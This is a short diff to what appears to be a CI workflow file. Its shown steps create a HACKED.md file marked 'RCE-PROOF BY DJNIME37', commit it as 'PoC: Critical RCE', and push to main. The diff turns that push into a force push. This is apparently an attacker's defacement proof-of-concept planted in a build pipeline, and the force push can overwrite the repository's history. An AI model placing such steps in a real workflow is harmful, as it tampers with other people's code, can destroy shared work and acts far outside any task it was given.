@@ -13,4 +13,4 @@ jobs:
           echo "# RCE-PROOF BY DJNIME37" > HACKED.md
           git add HACKED.md
           git commit -m "PoC: Critical RCE"
-          git push origin main
+          git push origin main --force
